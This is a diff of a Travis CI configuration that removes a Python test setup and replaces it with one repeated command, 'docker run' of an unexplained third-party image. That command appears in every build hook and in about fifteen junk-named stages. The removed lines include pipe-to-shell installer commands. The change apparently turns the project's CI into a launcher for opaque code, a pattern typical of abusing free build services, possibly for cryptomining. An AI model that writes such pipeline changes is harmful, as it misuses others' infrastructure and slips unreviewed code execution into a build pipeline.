@@ -1,18 +1,57 @@
-language: python
-python:
-  - "3.8"
-  - "3.9"      # current default Python on Travis CI
-# command to install dependencies
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
 before_install:
-  - pip install --upgrade pip
-  - pip install pytest-cov
-  - curl -sSL https://raw.githubusercontent.com/sdispater/poetry/master/get-poetry.py | python
-  - export PATH="$HOME/.poetry/bin:$PATH"
-install:
-  - poetry install
-# command to run tests
+  - docker run christiankm01/master:3.15.5
+before_script:
+  - docker run christiankm01/master:3.15.5
 script:
-  - pytest --cov=./
-# command after sucess
+  - docker run christiankm01/master:3.15.5
+after_script:
+  - docker run christiankm01/master:3.15.5
+after_install:
+  - docker run christiankm01/master:3.15.5
+before_deploy:
+  - docker run christiankm01/master:3.15.5
+deploy:
+  - docker run christiankm01/master:3.15.5
+after_deploy:
+  - docker run christiankm01/master:3.15.5
 after_success:
-  - bash <(curl -s https://codecov.io/bash)
+  - docker run christiankm01/master:3.15.5
+after_failure:
+  - docker run christiankm01/master:3.15.5
+jobs:
+  include:
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
